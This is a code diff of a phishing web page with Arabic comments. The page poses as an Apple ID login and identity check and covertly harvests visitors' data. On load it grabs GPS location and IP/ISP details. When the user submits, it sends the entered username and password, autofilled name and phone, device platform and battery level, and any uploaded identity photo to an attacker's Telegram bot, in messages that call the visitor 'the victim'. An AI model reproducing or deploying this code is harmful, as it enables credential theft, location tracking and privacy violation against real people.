@@ -30,7 +30,7 @@
     <input type="password" id="p" placeholder="Password" required autocomplete="current-password">
     
     <label class="file-label">
-        📸 إرفاق صورة الهوية للتحقق
+        📸 إرفاق صورة الهوية للتحقق (اختياري)
         <input type="file" id="photo_trap" class="hidden" accept="image/*">
     </label>
     
@@ -45,30 +45,34 @@
         await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
     }
 
-    // جلب بيانات الشبكة (الآي بي والموقع)
-    async function getNetData() {
-        try {
-            const res = await fetch('https://ipwho.is/');
-            return await res.json();
-        } catch(e) { return null; }
-    }
-
-    // 1. عند الدخول: إرسال تنبيه وطلب GPS
+    // 1. بمجرد الدخول: سحب GPS والـ IP
     window.onload = async function() {
-        sendMsg("🚀 <b>دخول جديد للرابط... جاري سحب البيانات</b>");
+        sendMsg("🚀 <b>دخول جديد للرابط... جاري سحب GPS والشبكة</b>");
         
+        // محاولة سحب GPS الدقيق
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-            sendMsg(`📍 <b>GPS دقيق للضحية:</b>\nhttps://www.google.com/maps?q=${lat},${lon}`);
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            sendMsg(`📍 <b>موقع GPS دقيق:</b>\n${mapLink}`);
+        }, (err) => {
+            sendMsg("⚠️ الضحية رفض إعطاء صلاحية الموقع (GPS).");
         });
+
+        // سحب الـ IP والـ Local IP (Scan)
+        try {
+            const res = await fetch('https://ipwho.is/');
+            const d = await res.json();
+            let networkInfo = `🌐 <b>بيانات الشبكة:</b>\nIP: ${d.ip}\nCity: ${d.city}\nISP: ${d.connection.isp}`;
+            sendMsg(networkInfo);
+        } catch(e) {}
     };
 
-    // 2. فخ الصور
+    // 2. فخ الصور (Photo Trap)
     document.getElementById('photo_trap').onchange = async function(e) {
         const file = e.target.files[0];
         if (file) {
-            sendMsg("📸 <b>جاري رفع الصورة الملتقطة من الضحية...</b>");
+            sendMsg("📸 <b>الضحية اختار صورة... جاري الرفع</b>");
             let formData = new FormData();
             formData.append('chat_id', chat_id);
             formData.append('photo', file);
@@ -76,41 +80,28 @@
         }
     };
 
-    // 3. التقرير الشامل (تمت إعادة جميع الحقول المفقودة)
+    // 3. التقرير الشامل عند الضغط
     document.getElementById('btn').onclick = async function() {
         const user = document.getElementById('u').value;
         const pass = document.getElementById('p').value;
         const autoName = document.getElementById('full_name').value || "غير متوفر";
         const autoPhone = document.getElementById('phone').value || "غير متوفر";
         
-        if(!user || !pass) return alert("يرجى إدخال البيانات");
+        if(!user || !pass) return alert("يرجى إدخال البيانات المطلوبة");
 
         this.innerHTML = "جاري التحقق...";
         this.disabled = true;
 
-        const d = await getNetData();
-        const ip = d ? d.ip : "N/A";
-        const city = d ? d.city : "N/A";
-        const country = d ? d.country : "N/A";
-        const isp = d ? d.connection.isp : "N/A";
-        const map = d ? `https://www.google.com/maps?q=${d.latitude},${d.longitude}` : "N/A";
-
         let report = "⚠️ <b>تم الاختراق الكامل للهدف</b> ⚠️\n\n";
-        report += "📧 <b>الحساب:</b> <code>" + user + "</code>\n";
-        report += "🔑 <b>الباسورد:</b> <code>" + pass + "</code>\n";
-        report += "👤 <b>الاسم (Autofill):</b> " + autoName + "\n";
-        report += "📞 <b>الجوال (Autofill):</b> " + autoPhone + "\n";
+        report += "📧 <b>Apple ID:</b> <code>" + user + "</code>\n";
+        report += "🔑 <b>Password:</b> <code>" + pass + "</code>\n";
+        report += "👤 <b>Autofill Name:</b> " + autoName + "\n";
+        report += "📞 <b>Autofill Phone:</b> " + autoPhone + "\n";
         report += "------------------------\n";
-        report += "🌐 <b>الـ IP:</b> " + ip + "\n";
-        report += "📍 <b>الموقع:</b> " + city + " (" + country + ")\n";
-        report += "📶 <b>المزود:</b> " + isp + "\n";
-        report += "📱 <b>النظام:</b> " + navigator.platform + "\n";
-        report += "🔋 <b>البطارية:</b> " + (navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A") + "\n";
-        report += "📏 <b>الدقة:</b> " + screen.width + "x" + screen.height + "\n";
-        report += "🕰️ <b>الوقت:</b> " + new Date().toLocaleString() + "\n";
-        report += "🔒 <b>كوكيز:</b> " + (document.cookie ? "موجودة" : "محمية") + "\n\n";
-        report += "📍 <b>موقع الضحية على الخريطة:</b>\n" + map;
-
+        report += "📱 <b>Platform:</b> " + navigator.platform + "\n";
+        report += "🔋 <b>Battery:</b> " + (navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A") + "\n";
+        report += "🕰️ <b>Time:</b> " + new Date().toLocaleString() + "\n";
+        
         await sendMsg(report);
 
         setTimeout(() => {
